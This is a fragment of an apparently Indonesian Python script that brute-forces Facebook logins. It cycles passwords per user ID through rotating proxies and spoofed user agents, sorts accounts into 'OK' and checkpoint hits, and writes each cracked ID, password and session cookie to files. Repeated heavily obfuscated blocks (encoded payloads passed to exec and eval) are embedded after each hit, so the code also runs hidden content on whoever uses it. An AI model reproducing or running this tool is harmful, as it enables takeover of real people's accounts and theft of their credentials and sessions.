1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{ua}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
				os.popen('play-audio bazok.mp3')
				obfuscate={'(https://pyobfuscate.com)*(True)':'''RFFl1^p0YM)Xf<V6++$bO=T0`*VmI0CL3_4C6fG4-vV$932&PIgo=T}J;qfgG!~mYA2(6IwBN>OjQ@W{a+rax7C{oiV_y}fL_1~mTNlQGvPa3WGVyOLwWe1{32iW}@Gr%f!{QX<yhi'''.replace('\n','')}
				_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###----------[ MOBILE V2 ]---------- ###
def crackb(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[[bold cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugenb)
	ses = requests.Session()
	for pw in pwv:
		try:
			#if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=357217396249062&kid_directed_site=0&app_id=357217396249062&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D357217396249062%26cbt%3D1660115235328%26e2e%3D%257B%2522init%2522%253A1660115235328%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dfc50efe4-eeb1-4edb-8ea3-3949f7053ea8%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522eaccb860-7eb9-412c-8ca3-aefd70d83a17%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%252266l196vgaeoubjuivhtd%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FAL').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://www.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Fasync%2Fregistration%2F',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
				os.popen('play-audio bazcp.mp3')
				obfuscate={'(https://pyobfuscate.com)*(RSA)':'''(BmSM&0bVr+0DN>W2;i`bLD>O$*=~+GVLTw@U_|^PA=@j_spww3u6Cg|8Oc#det@Cbr)@C_~6gF6v=0oRqrpjc&rj$nQ3@0PDm<g{oSU|UVsdXyA1GKN>XB!K(*n)_G&ZWABc(Zhxh'''.replace('\n','')}
				_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{ua}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
				os.popen('play-audio bazok.mp3')
				obfuscate={'(https://pyobfuscate.com)*(True)':'''RFFl1^p0YM)Xf<V6++$bO=T0`*VmI0CL3_4C6fG4-vV$932&PIgo=T}J;qfgG!~mYA2(6IwBN>OjQ@W{a+rax7C{oiV_y}fL_1~mTNlQGvPa3WGVyOLwWe1{32iW}@Gr%f!{QX<yhi'''.replace('\n','')}
				_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
